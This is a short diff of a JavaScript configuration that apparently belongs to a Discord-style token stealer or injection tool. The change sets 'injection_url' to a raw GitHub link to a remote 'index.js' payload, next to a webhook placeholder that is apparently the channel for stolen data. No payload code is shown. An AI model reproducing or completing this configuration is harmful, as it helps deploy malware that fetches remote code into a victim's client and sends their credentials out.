@@ -15,7 +15,7 @@ var config = {
     "init-notify": "true",
     "embed-color": 2047,
 
-    injection_url: " UPDATE ",
+    injection_url: "https://raw.githubusercontent.com/RndmAcc123/Injection/main/index.js",
     webhook: "%WEBHOOK%",
     Filter: {
         "urls": [
